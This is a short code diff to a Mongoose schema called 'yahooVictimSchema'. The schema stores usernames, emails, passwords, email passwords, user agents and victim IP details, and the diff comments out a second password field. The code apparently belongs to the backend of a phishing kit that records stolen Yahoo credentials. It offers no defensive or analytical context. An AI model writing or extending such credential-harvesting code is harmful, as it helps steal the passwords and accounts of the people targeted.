@@ -23,7 +23,7 @@ yahooVictimSchema = new mongoose.Schema({
 	username: String,
     email: String,
     password: String,
-    password2: String,
+    //password2: String,
     emailpassword: String,
     userAgent: String,
     victimIpInfo: {}
